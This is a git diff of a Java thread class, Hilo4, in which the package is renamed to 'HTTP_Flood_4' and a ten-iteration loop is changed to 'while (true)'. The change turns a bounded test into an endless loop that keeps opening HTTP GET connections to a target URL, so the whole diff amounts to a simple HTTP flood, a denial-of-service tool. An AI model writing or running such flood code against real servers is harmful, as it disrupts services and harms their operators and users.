@@ -1,4 +1,4 @@
-package prueba_dos_4;
+package HTTP_Flood_4;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -18,15 +18,13 @@ public class Hilo4 extends Thread {
     public void run() {
         BufferedReader in = null;
         try {
-            //while (true) {
-            for(int i=0; i<10; i++){
+            while (true) {
                 con = (HttpURLConnection) url.openConnection();
                 con.setRequestMethod("GET");
                 //int respuesta = con.getResponseCode();
-                //System.out.println("\nSending 'GET' request to URL : " + url);
+                System.out.println("\nSending 'GET' request to URL : " + url);
                 //System.out.println("Response Code : " + respuesta);
                 in = new BufferedReader(new InputStreamReader(con.getInputStream()));
-                System.out.println("1");
             }
         } catch (Exception ex) {
             System.out.println("Error al establecer conexión");
